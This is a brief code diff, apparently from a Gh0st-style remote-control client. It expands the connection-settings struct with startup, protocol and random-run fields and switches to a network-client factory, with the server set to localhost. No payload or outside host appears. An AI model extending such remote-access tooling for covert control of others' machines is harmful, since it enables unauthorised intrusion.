@@ -11,7 +11,10 @@
 #define CLIENT_PARALLEL_NUM 1
 
 // 远程地址
-CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION};
+CONNECT_ADDRESS g_SETTINGS = {
+	FLAG_GHOST, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION,
+	FALSE, Startup_DLL, NULL, PROTO_TCP, RUNNING_RANDOM,
+};
 
 // 最终客户端只有2个全局变量: g_SETTINGS、g_MyApp，而g_SETTINGS作为g_MyApp的成员.
 // 因此全局来看只有一个全局变量: g_MyApp
@@ -480,7 +483,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 		settings.SetServer(list[0].c_str(), settings.ServerPort());
 	}
 	State& bExit(app.g_bExit);
-	IOCPClient  *ClientObject = new IOCPClient(bExit);
+	IOCPClient  *ClientObject = NewNetClient(&settings, bExit);
 	CKernelManager* Manager = nullptr;
 
 	if (!app.m_bShared) {
